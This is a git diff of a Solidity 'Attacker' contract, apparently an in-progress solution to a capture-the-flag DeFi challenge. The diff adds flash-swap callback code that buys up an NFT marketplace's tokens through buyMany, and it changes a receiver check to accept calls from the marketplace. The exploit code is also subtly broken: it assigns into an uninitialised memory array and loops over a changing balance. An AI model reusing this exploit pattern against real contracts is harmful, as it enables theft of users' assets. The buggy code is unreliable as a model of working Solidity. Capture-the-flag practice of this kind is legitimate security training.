@@ -78,7 +78,16 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
 
         // Your custom code would go here. For example, code to arbitrage.
         require(tokenBorrow == address(weth), "token borrow != WETH");
-
+        uint256 counter = 0;
+        uint256[] memory tokenIds;
+        for (
+            counter;
+            counter < _nft.balanceOf(address(freeRiderNFTMarketplace));
+            counter++
+        ) {
+            tokenIds[counter] = counter;
+        }
+        freeRiderNFTMarketplace.buyMany(tokenIds);
         // about 0.3% fee, +1 to round up
         uint fee = (amount1 * 3) / 997 + 1;
         uint256 amountToRepay = amount1 + fee;
@@ -100,8 +109,7 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
         uint256 _tokenId,
         bytes memory
     ) external override nonReentrant returns (bytes4) {
-        require(msg.sender == address(_nft));
-        // This require might be the way to exploit it.
+        require(msg.sender == address(freeRiderNFTMarketplace));
         require(tx.origin == _attacker);
         require(_tokenId >= 0 && _tokenId <= 5);
         require(_nft.ownerOf(_tokenId) == address(this));
